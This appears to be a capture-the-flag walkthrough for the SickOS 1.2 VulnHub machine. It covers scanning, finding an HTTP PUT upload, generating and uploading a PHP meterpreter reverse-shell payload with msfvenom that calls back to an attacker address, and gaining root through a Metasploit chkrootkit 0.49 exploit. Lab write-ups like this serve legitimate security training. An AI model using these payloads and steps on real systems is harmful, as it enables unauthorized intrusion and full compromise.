@@ -1,0 +1,81 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the SickOS 1.2 VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-sickos-1-2-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-07T06:47:14+00:00">September 7, 2016</time><time class="updated" datetime="2025-06-10T20:30:39+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this walkthrough, I will explain how to solve the SickOs 1.2 challenge. This OS is second in the following series from SickOs and is independent of the prior releases, the scope of the challenge is to gain highest privileges on the system. This CTF gives a clear analogy of how hacking strategies can be performed on a network to compromise it in a safe environment.</span></p>
+<p><span style="color: #000000;">First Download Sick OS from <span style="color: #0000ff;"><strong>Here</strong></span></span></p>
+<h3><span style="color: #800000;"><strong>Breaching Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
+<li><span style="color: #000000;">Directory brute-force (dirb)</span></li>
+<li><span style="color: #000000;">Find HTTP Options: PUT (curl)</span></li>
+<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
+<li><span style="color: #000000;">Install Poster (Firefox plug-in)</span></li>
+<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
+<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
+<li><span style="color: #000000;">Privilege Escalation (cron job)</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s start!!</strong></span></p>
+<p><span style="color: #000000;">So, first let us find our target by using :</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Crp5j0nEFww/WuLZ671NFdI/AAAAAAAAWf0/6KtZq6_tpp0uIXtgBW_MXuc853O3t5HiwCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Our target is <strong>192.168.1.109 </strong>Further we will apply a nmap scan:</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.109</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dL9tDj_q5II/WuLZ71-5YGI/AAAAAAAAWgE/E-7Zs5WJWu4NQdh3PkQgWU5iimqDzNH8wCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">As you can see that port 80 is open that means we can open this IP in the browser. Why not do that?</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MCRkaxalc3M/WuLZ8lHy2-I/AAAAAAAAWgQ/TKulc2ecqiQJ5bo3dDNF636JUbUuLcisACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Opening the IP in the browser will show us the above image which is of no use. You can try and look into the page source but unfortunately, you will find nothing there. That is why we will use dirb and to find the directories. And for that type:</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.109</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MrYcMf3dE-0/WuLZ8YAtEzI/AAAAAAAAWgM/4pcDxaotZdgDOSpkXxzd4B4EVBkV9NwxwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">As a result, you can see we have found our directory i.e. <strong>test </strong>Open it in the browser as well.</span></p>
+<pre class="lang:default decode:true">192.168.1.109/test/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-puLrdq3Jtk8/WuLZ8ygmnhI/AAAAAAAAWgU/R5CNEiudQsUpzN3ayYCHHsiTReU-IWbwACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">It will show you the list of directories. So let us try and explore test directory via <strong>curl</strong>.</span></p>
+<pre class="lang:default decode:true ">curl -v -X OPTIONS http://192.168.1.109/test</pre>
+<p><span style="color: #000000;">This exploring will show you that <strong>PUT</strong> is allowed that means you can upload any file through it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JdeP1YHQclE/WuLZ8wXCKlI/AAAAAAAAWgY/1UDx4HUOsVUg4PM9XXPyBx2tH3gspMleQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">So, prepare the malicious file that you would upload with msfvenom:</span></p>
+<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=443 -f raw</pre>
+<p><span style="color: #000000;">On the other hand run multi/handler inside Metasploit framework.</span></p>
+<p><span style="color: #000000;">Copy the code from <strong>&lt;?php</strong> to <strong>die();</strong> and paste it to a text file with the extension .php for example shell.php and ready to upload the said file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zxWUEEGc4Ac/WuLZ9BUbVQI/AAAAAAAAWgc/SblG_U_h4UoLCAbn_mhbJ0XLQc45PRNRwCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now to upload your .php file we will use the add-on<strong> poster</strong>. Click on the<strong> tools</strong> from the <strong>menu bar</strong>. And then click on <strong>Poster</strong> from the drop-down menu. The following dialog box will open. Here, browse the file that you will upload and click on<strong> PUT </strong>option.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2KWtH41Nrk8/WuLZ9cDed4I/AAAAAAAAWgg/bJnfYOw-vbA8VyayzX31vPtQJ-fy2SKPQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">It will show you that the file is uploaded</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JDRGVGtKV0s/WuLZ9eRBzqI/AAAAAAAAWgk/819zyNJLINU0qQHoea4ArC8l2cq_JDBmwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">And you can see the same on your browser that you file will be uploaded (as in our case the file is shell.php) now run the file you just uploaded.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-EcclO73yFpw/WuLZ60bPElI/AAAAAAAAWf8/Ju-7yykFAxMQbB6eYk0JSBeBKXpNe2vjgCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="lang:default decode:true">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 443
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;"><span style="color: #000000;">From given below image you can observe </span><strong style="color: #000000;">Meterpreter </strong><span style="color: #000000;"><b>session 1</b>. But the task is not finished yet, still, we need to penetrate more for privilege escalation.</span></span></p>
+<p><span style="color: #000000;">Then I check for <strong>cron jobs</strong> from inside <strong>/etc/crontab</strong> and here found some schedule jobs.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7VePh-RC_fk/WuLZ7MQH4lI/AAAAAAAAWf4/RAcKcNrQ4h4Fhyqt20tcgm7giRWjl2M_QCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Moving further type the following to explore more and find something to be exploitable:</span></p>
+<pre class="lang:default decode:true ">cat /etc/crontab</pre>
+<p><span style="color: #000000;">The above command will give you the list of the files. On observing you can see that there is <strong>chkrootkit. </strong>Some of its version is exploitable therefore we will check its version and for that type:</span></p>
+<pre class="lang:default decode:true ">chkrootkit -V</pre>
+<p><span style="color: #000000;">It will show you the version which is<strong> 0.49</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xxpJX7UnLtY/WuLZ7blho1I/AAAAAAAAWgA/XDrx0ITbKHQZNkwovYRQkYHJs3Yjzb3tACLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">With help of Google, we came to know that Metasploit contains an exploit for chkrootkit exploitation. After entering following command as shown in the given image to load <strong>exploit/unix/local/chkrootkit </strong>module then set <strong>session 1</strong> and arbitrary<strong> lport</strong> such as <strong>8080 </strong>and run the module.</span></p>
+<p><span style="color: #000000;">This will give another session, as you can see we have spawned <strong>command shell</strong> of the target’s machine. Now if you will check uid by typing <strong>id</strong> it will show <strong>uid=0 as root</strong>.</span></p>
+<pre class="lang:default decode:true">id
+cd /root</pre>
+<p><span style="color: #000000;">And to see the list of files in /root type :</span></p>
+<pre class="lang:default decode:true">ls -lsa</pre>
+<p><span style="color: #000000;">In the list you will see that there is a text file and read that file type :</span></p>
+<pre class="lang:default decode:true">cat 7d83aaa2bf93d8040f3f22ec6ad9d5a.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-h-s833UHAi8/WuLZ7jryjzI/AAAAAAAAWgI/M0W3txj-RwgJ0geyI1xUqc1VxI7-EdCpQCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
